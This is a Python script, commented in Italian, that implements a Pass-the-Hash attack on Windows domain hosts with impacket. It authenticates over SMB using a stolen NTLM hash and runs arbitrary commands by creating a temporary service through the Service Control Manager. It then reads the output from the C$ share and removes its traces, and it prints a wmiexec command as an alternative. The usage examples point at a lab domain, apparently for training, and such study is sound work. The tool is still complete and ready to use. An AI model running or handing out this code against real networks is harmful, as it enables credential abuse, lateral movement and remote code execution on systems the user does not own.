#!/usr/bin/env python3
"""
Pass-the-Hash Script - pth.py
Usa hash NTLM per autenticarsi ed eseguire comandi remoti senza conoscere la password.

Teoria Pass-the-Hash:
    Windows salva le password come hash NTLM (MD4 della password Unicode).
    Quando ti autentichi a un servizio via SMB, il protocollo NTLM usa un
    meccanismo challenge-response basato sull'hash, NON sulla password in chiaro.

    Questo significa che se hai l'hash, puoi autenticarti come se avessi la password.
    Non serve crackarlo — l'hash stesso è sufficiente per il login.

    Differenza Pass-the-Hash vs Pass-the-Ticket:
    - PtH: usa hash NTLM per autenticazione NTLM (SMB)
    - PtT: usa ticket Kerberos rubato per autenticazione Kerberos
    Il tuo tool implementa PtH perché è più diretto e comune.
"""

import argparse
import sys


def pth_smbexec(dc_ip, domain, username, nthash, command):
    """
    Esegue un comando remoto via SMB usando Pass-the-Hash.
    Usa smbexec di impacket: crea un servizio Windows temporaneo
    che esegue il comando e cattura l'output.
    """
    from impacket.smbconnection import SMBConnection
    from impacket.dcerpc.v5 import scmr, transport

    domain_upper = domain.upper()
    lmhash = 'aad3b435b51404eeaad3b435b51404ee'  # LM hash vuoto standard

    print(f"[*] Connessione SMB a {dc_ip} come {username} (Pass-the-Hash)...")

    try:
        smb_conn = SMBConnection(dc_ip, dc_ip, sess_port=445)
        smb_conn.login(username, '', domain_upper, lmhash, nthash)

        print(f"[+] Autenticazione riuscita! Connesso come {domain_upper}\\{username}")
        print(f"[+] OS: {smb_conn.getServerOS()}")
        print(f"[+] Server: {smb_conn.getServerName()}")

        # Se non c'è un comando, mostra solo che il login ha funzionato
        if not command:
            print(f"\n[+] Pass-the-Hash verificato con successo!")
            smb_conn.logoff()
            return True

        # Esegui comando remoto tramite servizio SCM
        print(f"\n[*] Esecuzione comando: {command}")

        # Connessione al Service Control Manager via DCE/RPC
        rpctransport = transport.SMBTransport(dc_ip, 445, r'\svcctl',
                                              smb_connection=smb_conn)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(scmr.MSRPC_UUID_SCMR)

        # Apri il Service Control Manager
        resp = scmr.hROpenSCManagerW(dce)
        sc_handle = resp['lpScHandle']

        # Crea un servizio temporaneo che esegue il comando
        # L'output viene scritto in un file temporaneo e poi letto
        output_file = f"\\Windows\\Temp\\pth_output_{id(command)}.txt"
        cmd_str = f'cmd.exe /c {command} > C:{output_file} 2>&1'
        service_name = 'PTHSvc'

        try:
            # Prova a eliminare il servizio se esiste già
            resp = scmr.hROpenServiceW(dce, sc_handle, service_name)
            scmr.hRDeleteService(dce, resp['lpServiceHandle'])
            scmr.hRCloseServiceHandle(dce, resp['lpServiceHandle'])
        except:
            pass

        # Crea il servizio
        resp = scmr.hRCreateServiceW(
            dce, sc_handle, service_name, service_name,
            lpBinaryPathName=cmd_str,
            dwStartType=scmr.SERVICE_DEMAND_START,
        )
        service_handle = resp['lpServiceHandle']

        # Avvia il servizio (esegue il comando)
        try:
            scmr.hRStartServiceW(dce, service_handle)
        except:
            pass  # Il servizio "fallisce" ma il comando viene eseguito

        # Leggi l'output dal file temporaneo
        import time
        time.sleep(2)

        try:
            tid = smb_conn.connectTree('C$')
            fid = smb_conn.openFile(tid, output_file.replace('\\', '/').lstrip('/'))
            output = smb_conn.readFile(tid, fid)
            smb_conn.closeFile(tid, fid)
            smb_conn.deleteFile('C$', output_file.replace('\\', '/').lstrip('/'))
            print(f"\n--- OUTPUT ---")
            print(output.decode('utf-8', errors='replace').strip())
            print(f"--- FINE ---")
        except Exception as e:
            print(f"[-] Impossibile leggere output: {e}")

        # Pulizia: elimina il servizio
        try:
            scmr.hRDeleteService(dce, service_handle)
            scmr.hRCloseServiceHandle(dce, service_handle)
        except:
            pass

        smb_conn.logoff()
        return True

    except Exception as e:
        print(f"[-] Errore: {e}")
        return False


def pth_wmiexec(dc_ip, domain, username, nthash, command):
    """
    Alternativa più semplice: usa wmiexec di impacket.
    WMI (Windows Management Instrumentation) permette esecuzione remota.
    """
    from impacket.smbconnection import SMBConnection

    domain_upper = domain.upper()
    lmhash = 'aad3b435b51404eeaad3b435b51404ee'

    print(f"[*] Connessione SMB a {dc_ip} come {username} (Pass-the-Hash)...")

    try:
        smb_conn = SMBConnection(dc_ip, dc_ip, sess_port=445)
        smb_conn.login(username, '', domain_upper, lmhash, nthash)

        print(f"[+] Autenticazione PtH riuscita!")
        print(f"[+] Connesso come: {domain_upper}\\{username}")
        print(f"[+] Server OS: {smb_conn.getServerOS()}")
        print(f"[+] Server Name: {smb_conn.getServerName()}")

        # Elenca le share accessibili (dimostra i permessi)
        print(f"\n[*] Share accessibili:")
        shares = smb_conn.listShares()
        for share in shares:
            share_name = share['shi1_netname'][:-1]  # Rimuovi null terminator
            share_type = share['shi1_type']
            print(f"  [+] {share_name}")

        if command:
            print(f"\n[*] Per eseguire comandi, usa wmiexec.py direttamente:")
            print(f"    wmiexec.py -hashes {lmhash}:{nthash} {domain_upper}/{username}@{dc_ip} \"{command}\"")

        smb_conn.logoff()
        return True

    except Exception as e:
        print(f"[-] Errore: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description='Pass-the-Hash - Autenticazione con NTLM hash senza password',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Esempi:
  python3 pth.py --dc-ip 192.168.56.10 --domain psychosec.local -u admin.helpdesk --nthash 520126a03f5d5a8d836f1c4f34ede7ce
  python3 pth.py --dc-ip 192.168.56.10 --domain psychosec.local -u admin.helpdesk --nthash 520126a03f5d5a8d836f1c4f34ede7ce -c "whoami"
        """
    )

    parser.add_argument('--dc-ip', required=True, help='IP del target')
    parser.add_argument('--domain', required=True, help='Nome dominio')
    parser.add_argument('-u', '--username', required=True, help='Username')
    parser.add_argument('--nthash', required=True, help='Hash NTLM (32 caratteri hex)')
    parser.add_argument('-c', '--command', default=None, help='Comando da eseguire (opzionale)')
    parser.add_argument('--method', choices=['smb', 'wmi'], default='wmi', help='Metodo (default: wmi)')

    args = parser.parse_args()

    print("""
    ╔══════════════════════════════════════════╗
    ║       PASS-THE-HASH v1.0                 ║
    ║       Target: {:<26s}║
    ╚══════════════════════════════════════════╝
    """.format(args.dc_ip))

    print(f"[*] Username: {args.username}")
    print(f"[*] NT Hash:  {args.nthash}")
    print(f"[*] Metodo:   {args.method}")
    print()

    if args.method == 'smb':
        success = pth_smbexec(args.dc_ip, args.domain, args.username, args.nthash, args.command)
    else:
        success = pth_wmiexec(args.dc_ip, args.domain, args.username, args.nthash, args.command)

    if success:
        print(f"\n[+] Pass-the-Hash completato con successo!")
    else:
        print(f"\n[-] Pass-the-Hash fallito.")


if __name__ == '__main__':
    main()
